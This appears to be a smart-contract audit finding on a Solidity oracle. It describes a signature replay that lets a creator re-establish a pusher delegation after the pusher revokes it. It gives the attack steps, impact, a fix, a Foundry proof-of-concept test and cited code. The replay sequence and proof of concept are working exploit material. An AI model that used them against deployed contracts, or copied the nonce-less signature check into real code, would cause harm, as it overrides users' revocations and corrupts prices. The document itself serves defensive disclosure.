The `_ensureDeadline` implementation confirms there is no nonce, no used-signature bitmap, and no invalidation on revocation — only a timestamp ceiling check. [1](#0-0) 

The `allowPushers` signature covers `(block.chainid, address(this), deadline, pusher, msg.sender)` with no nonce component. [2](#0-1) 

`revokePusher` only zeroes `namespaceRemapping[msg.sender]`; it does not invalidate any outstanding signature. [3](#0-2) 

The code comment at lines 186–191 explicitly acknowledges the concern ("an undated signature could re-establish a delegation AFTER the pusher revoked it") but the fix applied — requiring a deadline — only prevents replay *after* the deadline expires. Within the deadline window the same bytes can be submitted again with no restriction. [4](#0-3) 

---

### Title
EIP-191 Signature Replay in `allowPushers` Allows Creator to Override Pusher's Revocation Within Deadline Window — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary
`allowPushers` binds the pusher's consent to `(chainid, address(this), deadline, pusher, creator)` with no nonce and no used-signature tracking. `revokePusher` clears `namespaceRemapping[pusher]` but does not invalidate the outstanding signature. Any time before `deadline`, the creator can resubmit the identical calldata and re-establish the delegation the pusher just revoked.

### Finding Description
The attack sequence is:

1. Pusher signs consent for `deadline = T + D`.
2. Creator calls `allowPushers(deadline, [pusher], [sig])` → `namespaceRemapping[pusher] = creator`.
3. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator immediately replays the identical `allowPushers(deadline, [pusher], [sig])` call (still before `T + D`) → `namespaceRemapping[pusher] = creator` again.

Step 4 succeeds unconditionally because:
- `_ensureDeadline` only checks `block.timestamp <= deadline` — still true.
- The ECDSA recovery still returns `pusher` — the signature is mathematically valid.
- There is no nonce, no `usedSignatures` mapping, and no check that the pusher's current mapping is non-zero before overwriting it.

The creator can repeat step 4 as many times as desired until the deadline expires, making `revokePusher` a no-op for the entire deadline window. [5](#0-4) 

### Impact Explanation
After the creator re-establishes delegation, the pusher's fallback pushes are routed into the creator's namespace rather than the pusher's own namespace. The pusher, believing they have revoked, may continue pushing prices (e.g., from an automated bot). Those prices land in the creator's namespace and are consumed by any pool registered against a `feedId` derived from the creator's address. This enables bad-price execution: the creator can force a pusher's price stream into a pool's oracle feed without the pusher's current consent, corrupting the mid-price and spread values that govern swap settlement.

### Likelihood Explanation
The creator already possesses the original signature bytes (they submitted them in step 2). No additional off-chain material is needed. The replay requires a single on-chain transaction and is executable by any EOA that was the `msg.sender` in the original `allowPushers` call. Deadline windows are typically hours to days, giving ample time to execute.

### Recommendation
Track consumed signatures with a `mapping(bytes32 => bool) private _usedDelegationSigs` keyed on the signature hash (or the message hash), and revert if the same hash is presented a second time. Alternatively, include a per-pusher nonce in the signed payload and increment it on every successful `allowPushers` or `revokePusher` call, so any previously issued signature becomes invalid after revocation.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayTest is Test {
    CompressedOracleV1 oracle;
    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 60 seconds);
        pusher = vm.addr(PUSHER_KEY);
    }

    function testReplayAfterRevoke() public {
        uint256 deadline = block.timestamp + 1000;

        // Pusher signs consent
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // Step 1: creator delegates pusher
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // Step 2: pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // Step 3: creator replays the SAME signature before deadline
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // must NOT succeed, but does

        // Invariant violated: revoked pusher is re-delegated without a fresh signature
        assertEq(oracle.namespaceRemapping(pusher), creator, "re-delegated via replay");
    }
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-212)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```
